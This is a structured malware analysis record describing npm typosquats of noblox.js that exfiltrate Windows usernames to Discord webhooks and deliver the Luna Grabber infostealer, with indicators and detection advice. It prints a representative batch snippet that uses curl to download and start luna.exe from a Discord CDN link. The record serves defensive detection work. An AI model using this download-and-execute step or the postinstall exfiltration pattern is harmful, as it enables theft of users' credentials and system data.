package_info.why_malicious: These packages are typosquats of the legitimate noblox.js package and contain a multistage malicious payload. They exfiltrate system and user information and deliver the Luna Grabber infostealer malware. The packages mimic legitimate behavior to evade detection, but execute postinstall scripts that download and run additional malicious payloads, resulting in credential and system data theft.

malicious_snippets.code_behavior: During postinstall, the code collects the Windows username, sends it to a Discord webhook via HTTPS POST, downloads a remote batch file (payload.bat) from Discord CDN, writes it to disk as z.bat, and executes it on Windows systems, resulting in exfiltration of user data and execution of a second-stage payload.

malice_analysis.why_suspicious: The postinstall script exfiltrates user information (Windows username) to an external Discord webhook and downloads and executes a remote batch file, which is a clear indicator of malicious activity. Use of Discord infrastructure for both exfiltration and payload delivery is a common malware tactic.
malice_analysis.violated_expectations: Legitimate postinstall scripts are expected to perform setup or display messages, not to collect and exfiltrate user data or execute remote code.
malice_analysis.similar_legitimate_use: Legitimate postinstall scripts may perform environment checks or display installation messages, but do not exfiltrate data or execute downloaded code from untrusted sources.
key_indicators: Exfiltration of Windows username to hardcoded Discord webhook
Download and execution of remote batch file from Discord CDN
Conditional execution based on Windows OS
Use of child_process.exec to run downloaded code
Presence of hardcoded external URLs in postinstall.js

malicious_snippets.code_snippet:
REM (Representative, actual content not shown)
@echo off
REM Download and execute PyInstaller-compiled Luna Grabber executable
curl -o luna.exe https://cdn.discordapp.com/attachments/.../luna.exe
start luna.exe
malicious_snippets.code_behavior: During postinstall (second stage), the batch script uses curl to download a PyInstaller-compiled executable (luna.exe) from Discord CDN and executes it, resulting in the launch of the Luna Grabber infostealer on the victim's system.

malice_analysis.why_suspicious: The batch script is downloaded and executed automatically during installation, and it fetches and runs an untrusted executable from an external source (Discord CDN), which is a hallmark of staged malware delivery.
malice_analysis.violated_expectations: No legitimate npm package should download and execute arbitrary binaries as part of its installation process, especially from non-official sources like Discord CDN.
malice_analysis.similar_legitimate_use: Legitimate installers may fetch dependencies, but only from trusted sources and with user consent. Downloading and executing binaries from Discord CDN is not a standard or safe practice.
key_indicators: Remote download of executable (luna.exe) via curl
Execution of untrusted binary immediately after download
Use of Discord CDN as payload delivery infrastructure
Automated execution of batch script during installation

malice_analysis.why_suspicious: The executable is a known infostealer (Luna Grabber) and is configured to collect and exfiltrate system information to an attacker-controlled Discord webhook. malice_analysis.similar_legitimate_use: System information collection may be legitimate in diagnostic or support tools, but exfiltration to Discord webhooks is never appropriate in legitimate software.
key_indicators: Use of open-source infostealer (Luna Grabber) executable

Automated collection and exfiltration of system information

attack_chain.action: User installs malicious npm package (typosquat of noblox.js).
Postinstall script collects Windows username and exfiltrates it to a Discord webhook; downloads and executes a second-stage batch file if on Windows.
Second-stage batch file downloads and executes Luna Grabber executable from Discord CDN.
attack_chain.leads_to: Luna Grabber infostealer runs on victim system.

attack_chain.action: Luna Grabber collects system information and exfiltrates it to attacker's Discord webhook.

behavioral_signatures: npm postinstall scripts making outbound network requests to Discord webhooks
postinstall scripts downloading and executing remote batch or executable files from Discord CDN
Presence of PyInstaller-compiled infostealer executables (Luna Grabber) in package installation flow
Exfiltration of system or user information to Discord webhooks during or after installation
file_indicators: postinstall.js containing network requests and child_process.exec calls
Downloaded batch files (e.g., z.bat) present in the package directory after installation
Presence of luna.exe or similar PyInstaller-compiled binaries in the package or installation directory
Hardcoded references to Discord CDN or Discord webhooks in JavaScript or batch files
network_indicators: HTTPS POST requests to discord.com/api/webhooks/* (exfiltration endpoints)
Unusual HTTP POSTs or file downloads during npm install process
detection_knowledge.how_to_detect: Monitor npm package installations for postinstall scripts that initiate outbound network connections, especially to Discord webhooks or Discord CDN. Flag packages that download and execute remote batch or executable files during installation. Scan for the presence of known infostealer binaries (e.g., Luna Grabber) and check for exfiltration of system or user information to external endpoints. Use static and dynamic analysis to identify suspicious postinstall.js scripts, hardcoded Discord URLs, and typosquatting package names.
